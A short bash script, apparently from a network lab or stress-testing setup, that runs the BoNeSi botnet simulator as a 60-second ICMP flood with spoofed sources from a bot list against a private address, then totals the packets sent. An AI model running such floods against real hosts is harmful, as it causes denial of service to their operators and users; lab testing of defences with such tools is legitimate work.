#!/bin/bash

OUTPUT_FILE="bonesi_output.txt"

# BoNeSi ICMP Echo Flood (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p icmp 192.168.100.2:50001 -s 0 > "$OUTPUT_FILE" 2>&1

TOTAL_PACKETS=$(grep -oP '\d+(?= packets in)' "$OUTPUT_FILE" | awk '{s+=$1} END {print s}')

echo "$TOTAL_PACKETS packets sent"